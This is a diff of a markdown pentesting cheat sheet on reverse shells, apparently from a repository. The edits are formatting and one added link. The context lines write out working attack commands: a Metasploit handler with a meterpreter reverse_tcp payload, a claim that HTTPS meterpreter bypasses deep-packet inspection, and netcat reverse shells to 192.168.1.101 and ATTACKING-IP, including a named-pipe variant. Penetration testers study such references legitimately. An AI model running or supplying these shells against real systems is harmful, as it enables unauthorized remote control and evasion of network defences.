@@ -26,7 +26,7 @@ use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 ```
 
-**Meterpreter HTTPS**  
+**Meterpreter HTTPS**
 
 It makes the meterpreter-traffic look normal. Since it is hidden in https the communication is encrypted and can be used to bypass deep-packet inspections.
 
@@ -114,6 +114,7 @@ nc.exe 192.168.1.101 443 -e cmd.exe
 ```
 
 **With -e flag**
+
 ```
 nc -e /bin/sh ATTACKING-IP 80
 ```
@@ -126,7 +127,10 @@ nc -e /bin/sh ATTACKING-IP 80
 
 ```
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
+
 ```
+
+Upgrade Netcat shell to an interactive: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 
 ### Ncat
 
